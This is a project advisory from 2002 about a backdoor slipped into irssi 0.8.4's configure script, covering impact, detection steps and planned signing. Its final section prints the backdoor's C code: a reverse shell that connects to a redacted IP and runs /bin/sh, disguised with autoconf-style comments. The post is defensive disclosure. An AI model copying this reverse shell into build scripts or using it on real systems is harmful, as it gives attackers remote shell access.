---
title: "Historical &ndash; irssi 0.8.4 backdoor"
layout: post
date: 2002-05-25
---

**irssi binary isn't backdoored, only the configure script that you
might have run while installing irssi.** This was done by cracking
into main.irssi.org and modifying the distributed tarball.

So, it seems someone has backdoored irssi's configure script sometimes
around 16 March, just a few days after 0.8.4 was released. Unless you
installed irssi before that, you might have run a backdoor that gave remote
attacker access to your computer.

**UPDATE (Jun 3rd):** I've heard of a few people's hard
drive being formatted due to this backdoor, but most of the people haven't
noticed anything.

#### What did the backdoor do? How to get rid of it?

The backdoored configure script spawns a new shell, connects to some
server and allows full shell access to it. So, it might have done
anything.

At least currently the server where it connects to doesn't do anything
automatically. I'd guess it just waits there for commands. As for fixing it,
it really depends on what it did, and we don't know that. So possibly it
didn't do anything, and you don't need to do anything, but possibly it ran a
rootkit or whatever and you'll need to reinstall your whole system. I'd
suggest doing that if you have any doubt.

In any case, you should make sure the process isn't running anymore by
killing all your /bin/sh processes, or by rebooting.

#### How do I know if I'm affected?

The backdoor was only in `configure`, the built binary itself
isn't backdoored. Here's some ways to figure out if you're affected:

- If you installed irssi from binary, you're safe.
- Debian sources aren't backdoored.
- Nightly source snapshots don't seem to be backdoored..
- CVS doesn't seem to be backdoored..
- irssi-0.8.4.tar.bz2 file wasn't backdoored, only the .gz one
- FreeBSD port isn't backdoored, as it used the .bz2 file
- irssi/SILC client isn't backdoored
- If you let irssi download the **GLib sources from irssi.org, they are backdoored** (the same configure thing as with irssi)
- If you still have the sources, check with `grep SOCK_STREAM configure`. If it returns any lines, it's backdoored.
- md5 checksum of originally released irssi-0.8.4.tar.gz is 57bf9d89638be3d377be211f0b0d7049. This is also the one of 0.8.4a.

#### Future plans

From now on, all new releases will be signed with GPG, and checked
automatically at least daily for any changes. I'll also start checksumming
and diffing any scripts and other stuff as well for changes.

main.irssi.org is also moved elsewhere for now, CVS is temporarily down
but everything else should work. Mirrors should catch up automatically
soon.

#### What exactly was the backdoor?

These lines were found from `configure` script:

            int s;
            struct sockaddr_in sa;
            switch(fork()) { case 0: break; default: exit(0); }
            if((s = socket(AF_INET, SOCK_STREAM, 0)) == (-1)) {
                    exit(1);
            }
      /* HP/UX 9 (%@#!) writes to sscanf strings */
            memset(&sa, 0, sizeof(sa));
            sa.sin_family = AF_INET;   
            sa.sin_port = htons(6667); 
            sa.sin_addr.s_addr = inet_addr("x.x.x.x");
            if(connect(s, (struct sockaddr *)&sa, sizeof(sa)) == (-1)) {
                    exit(1);
            }
            dup2(s, 0); dup2(s, 1); dup2(s, 2);
    /* The GNU C library defines this for functions which it implements
        to always fail with ENOSYS.  Some functions are actually named 
        something starting with __ and the normal name is an alias.  */
            { char *args[] = { "/bin/sh", NULL }; execve(args[0], args, NULL); }

Also the IP just changed yesterday from x.x.x.y.
